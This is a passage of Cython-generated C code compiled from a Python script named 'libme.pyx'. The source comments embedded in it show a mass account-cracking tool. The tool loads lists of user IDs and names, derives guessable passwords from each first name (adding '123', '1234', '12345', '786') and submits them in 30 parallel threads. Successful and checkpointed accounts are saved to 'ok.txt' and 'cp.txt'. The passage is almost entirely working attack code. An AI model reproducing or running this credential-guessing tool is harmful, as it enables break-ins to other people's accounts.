              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 758, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 758, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":759
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 759, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 759, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 759, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 759, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 759, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __pyx_t_4 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":758
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":761
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 761, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 761, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 761, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 761, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 761, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_6, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_6, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_6, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_6, 3, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_6, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_6));
                __pyx_t_6 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":762
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __mennn__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 762, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_file); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 762, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 762, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_4, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 762, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 762, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_4);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_4 = 0;
                __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 762, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":753
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":749
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__Frrr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_9) < 0) __PYX_ERR(0, 749, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 749, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 749, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 749, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_6);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_6, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 749, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 749, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":748
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":727
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__Frrr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_myfile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":763
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_49__mennn__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_49__mennn__ = {"__mennn__", (PyCFunction)__pyx_pw_5libme_5James_49__mennn__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_49__mennn__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__mennn__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_48__mennn__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_48__mennn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_pastefile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__mennn__", 0);

  /* "libme.pyx":764
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":765
 * 	def __mennn__(self):
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')             # <<<<<<<<<<<<<<
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 765, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_pastefile = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":766
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 766, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_pastefile);
      __Pyx_GIVEREF(__pyx_v_pastefile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_pastefile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 766, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 766, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 766, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 766, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 766, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 766, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 766, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 766, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 766, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 766, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":767
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 767, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 767, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 767, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 767, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":766
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":764
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __mennn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  [+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":768
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 * 		ask = input("  [!] Password method [y/t] : ")
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__mennn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 768, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":769
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))             # <<<<<<<<<<<<<<
 * 		ask = input("  [!] Password method [y/t] : ")
 * 		if ask == "y":
 */
      if (unlikely(!__pyx_v_pastefile)) { __Pyx_RaiseUnboundLocalError("pastefile"); __PYX_ERR(0, 769, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Your_Path_Wrong_Please_Check_Fi_2, __pyx_v_pastefile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 769, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 769, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
